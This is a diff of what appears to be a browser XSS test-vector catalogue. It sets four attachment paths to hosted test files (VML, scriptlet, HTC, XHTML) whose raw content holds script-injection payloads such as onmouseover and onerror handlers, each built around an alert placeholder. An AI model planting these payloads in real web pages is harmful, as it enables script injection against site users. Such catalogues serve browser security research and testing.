@@ -1039,7 +1039,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '0',            
-            'path'          : '',
+            'path'          : 'http://heideri.ch/jso/test.vml',
             'name'          : 'test.vml',
             'raw'           : '<xml>\r\n\t<rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" />\r\n</xml>'
         },
@@ -1616,7 +1616,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
-            'path'          : '',
+            'path'          : 'http://heideri.ch/jso/test.sct',
             'name'          : 'test.sct',
             'raw'           : '<SCRIPTLET>\r\n\t<IMPLEMENTS Type="Behavior"></IMPLEMENTS>\r\n\t<SCRIPT Language="javascript">%js_alert%</SCRIPT>\r\n</SCRIPTLET>'
         },        
@@ -1652,7 +1652,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
-            'path'          : '',
+            'path'          : 'http://heideri.ch/jso/test.htc',
             'name'          : 'test.htc',
             'raw'           : '<?xml version="1.0"?>\r\n<x>\r\n<payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload>\r\n</x>'
         },        
@@ -2015,7 +2015,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
-            'path'          : '',
+            'path'          : 'http://heideri.ch/jso/test.xxe',
             'name'          : '',
             'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml">%js_alert%</script>'
         },
